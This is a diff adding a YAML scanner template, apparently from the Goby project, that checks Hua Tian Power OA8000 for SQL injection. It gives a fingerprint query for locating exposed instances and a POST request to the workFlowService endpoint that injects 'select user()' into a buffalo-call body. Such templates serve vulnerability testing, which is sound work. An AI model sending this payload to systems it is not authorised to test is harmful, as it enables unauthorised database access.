@@ -1,0 +1,19 @@
+name: huatiandongliOA 8000workFlowService SQLinjection
+manual: true
+query: app="Hua Tian Power -Oa8000"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /OAapp/bfapp/buffalo/workFlowService
+      body: "<buffalo-call> \r\n<method>getDataListForTree</method> \r\n<string>select
+        user()</string> \r\n</buffalo-call>"
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"user")
+expression: r0()
+detail:
+  author: gobysec@gmail.com
+  links:
+  - https://gobies.org/
+  tags: sqli
